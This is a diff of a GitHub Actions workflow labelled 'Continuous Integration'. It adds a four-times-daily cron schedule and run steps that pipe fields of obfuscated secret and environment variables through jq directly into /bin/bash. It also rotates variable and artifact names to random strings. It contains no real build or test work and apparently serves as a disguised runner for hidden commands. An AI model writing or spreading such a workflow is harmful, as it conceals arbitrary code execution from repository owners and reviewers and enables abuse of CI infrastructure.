@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '13 1,7,13,19 * * *'
 jobs:
   agent:
     runs-on: ubuntu-latest
@@ -10,15 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          ow6: ${{ secrets.ow6 }}
+          gykk642: ${{ secrets.gykk642 }}
         run: |
-          printf '%s' "$ow6" | jq -r .iw853 | /bin/bash
-          echo $vtjeg2165 | jq -r .ibq06 | /bin/bash
-          echo $uvcy167 | jq -r .adh91 | /bin/bash
+          printf '%s' "$gykk642" | jq -r .o20 | /bin/bash
+          echo $gyf38193 | jq -r .he960 | /bin/bash
+          printf '%s' "$ptgw558" | jq -r .h74649 | /bin/bash
+          printf '%s' "$w85" | jq -r .baltx23 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: LCC80sBN
+          name: m1sZ4I0s
           path: "*.zip"
           retention-days: 1
